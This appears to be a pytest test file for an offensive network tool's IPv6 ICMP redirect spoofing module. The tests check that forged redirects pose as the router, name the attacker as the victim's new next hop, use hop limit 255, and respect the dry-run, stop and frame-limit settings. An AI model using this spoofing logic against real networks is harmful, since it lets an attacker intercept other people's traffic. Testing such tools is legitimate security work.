import threading

import pytest
from scapy.layers.inet6 import ICMPv6ND_Redirect, ICMPv6NDOptDstLLAddr, ICMPv6NDOptRedirectedHdr

from macabre.attacks import redirect_spoofing as rs
from macabre.attacks.redirect_spoofing import RedirectSpoofingConfig

ATTACKER = "02:00:00:00:10:03"
VICTIM = "02:00:00:00:10:02"
ROUTER_LL = "fe80::ff:fe00:1001"
DEST = "2001:db8:dead::1"


def config(**overrides):
    values = dict(iface="eth9", source_mac=ATTACKER, router_address=ROUTER_LL, victim_mac=VICTIM, frames=2)
    values.update(overrides)
    return RedirectSpoofingConfig(**values)


def capture(sent):
    return lambda frame, iface, verbose: sent.append((iface, frame))


def test_redirect_claims_the_router_as_its_source():
    frame = rs.build_redirect(config())
    assert frame.getlayer("IPv6").src == ROUTER_LL


def test_redirect_names_the_attacker_as_new_next_hop_and_the_destination():
    redirect = rs.build_redirect(config()).getlayer(ICMPv6ND_Redirect)
    assert str(redirect.tgt) == "fe80::ff:fe00:1003"
    assert str(redirect.dst) == DEST


def test_redirect_carries_the_attacker_mac_as_target_link_layer_option():
    option = rs.build_redirect(config()).getlayer(ICMPv6NDOptDstLLAddr)
    assert option.lladdr == ATTACKER


def test_redirect_carries_a_redirected_header_option():
    assert rs.build_redirect(config()).getlayer(ICMPv6NDOptRedirectedHdr) is not None


def test_redirect_uses_hop_limit_255_and_goes_to_the_victim_link_local_address():
    frame = rs.build_redirect(config())
    ip = frame.getlayer("IPv6")
    assert ip.hlim == 255
    assert ip.dst == "fe80::ff:fe00:1002"
    assert frame.dst == VICTIM and frame.src == ATTACKER


def test_run_sends_the_configured_number_of_redirects():
    sent = []
    stats = rs.run_redirect_spoofing(config(frames=4), threading.Event(), lambda _s: None, send=capture(sent))
    assert stats.frames == 4 and len(sent) == 4
    assert all(iface == "eth9" for iface, _ in sent)


def test_dry_run_sends_nothing():
    sent = []
    stats = rs.run_redirect_spoofing(config(dry_run=True), threading.Event(), lambda _s: None, send=capture(sent))
    assert sent == []
    assert stats.status.startswith("Dry run")


def test_stop_event_ends_the_run_early():
    sent = []
    stop = threading.Event()
    stop.set()
    stats = rs.run_redirect_spoofing(config(), stop, lambda _s: None, send=capture(sent))
    assert sent == [] and stats.frames == 0


@pytest.mark.parametrize("router", ["2001:db8::1", "ff02::1", "not-an-address"])
def test_router_address_must_be_link_local(router):
    with pytest.raises(ValueError):
        config(router_address=router)


def test_router_address_is_required():
    with pytest.raises(ValueError, match="Router address"):
        config(router_address="")


def test_victim_mac_is_required():
    with pytest.raises(ValueError, match="Victim MAC"):
        config(victim_mac="")


@pytest.mark.parametrize("destination", ["ff02::1", "fe80::1", "::"])
def test_destination_must_be_unicast_and_not_link_local(destination):
    with pytest.raises(ValueError):
        config(destination=destination)


@pytest.mark.parametrize("frames", [0, 101])
def test_frame_count_out_of_range_is_refused(frames):
    with pytest.raises(ValueError, match="Frames"):
        config(frames=frames)


def test_source_mac_is_required():
    with pytest.raises(ValueError):
        config(source_mac="")
